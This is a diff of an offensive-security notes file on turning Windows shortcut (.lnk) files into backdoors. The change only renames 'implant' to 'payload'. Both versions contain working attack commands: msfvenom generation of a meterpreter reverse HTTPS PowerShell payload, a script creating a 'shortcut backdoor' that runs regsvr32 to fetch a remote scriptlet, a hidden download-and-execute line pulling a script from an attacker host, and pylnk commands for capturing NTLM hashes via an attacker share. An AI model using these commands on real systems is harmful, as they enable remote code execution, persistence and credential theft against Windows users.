@@ -18,7 +18,7 @@ C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.exe
 > The **TargetPath** has a limit of 260 characters long. If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`.
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > implant.ps1
+$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > payload.ps1
 ```
 
 TODO: Remove timestamps in the .lnk file
@@ -28,9 +28,9 @@ $WScriptShell = New-Object -ComObject WScript.Shell
 $ShortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
 $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
 $Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
-$Shortcut.Arguments = '/c regsvr32.exe /s /n /u /i:http://<IP>/implant.sct scrobj.dll'
+$Shortcut.Arguments = '/c regsvr32.exe /s /n /u /i:http://<IP>/payload.sct scrobj.dll'
 # $Shortcut.TargetPath = 'conhost.exe'
-# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http[s]://<attacker_IP>/implant.ps1`'))`"`""
+# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http[s]://<attacker_IP>/payload.ps1`'))`"`""
 $Shortcut.Description = "A shortcut backdoor"
 # $Shortcut.IconLocation = 'C:\path\to\icon.ico'
 $Shortcut.IconLocation = 'shell32.dll,21'
@@ -45,7 +45,7 @@ $Shortcut.Save()
 ### 3.1 - Hidden file
 
 ```
-$ wine attrib.exe +h implant.ps1
+$ wine attrib.exe +h payload.ps1
 
 $ wine attrib.exe
 
@@ -53,7 +53,7 @@ $ wine cmd.exe /c dir /a:h
 ```
 
 ```
-$ pylnk c C:\Windows\System32\conhost.exe -a "powershell.exe -ep bypass -f implant.ps1" shortcut_file.lnk
+$ pylnk c C:\Windows\System32\conhost.exe -a "powershell.exe -ep bypass -f payload.ps1" shortcut_file.lnk
 ```
 
 ### 3.2 - Capture NTLM Relay
@@ -67,11 +67,11 @@ $ pylnk c \\<attacker_IP>\<share_name>\snare.txt shortcut_file.lnk
 Scriptlet file
 
 ```
-$ pylnk c C:\Windows\System32\regsvr32.exe -a "/s /u /i://<attacker_IP>/@snare scrobj.dll" implant.lnk
+$ pylnk c C:\Windows\System32\regsvr32.exe -a "/s /u /i://<attacker_IP>/@snare scrobj.dll" payload.lnk
 ```
 
 ```
-$ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "\\<attacker_IP>\key.pem root@<IP>" implant.lnk
+$ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "\\<attacker_IP>\key.pem root@<IP>" payload.lnk
 ```
 
 TODO: Provide use cases if any (refer to the link for SSH)
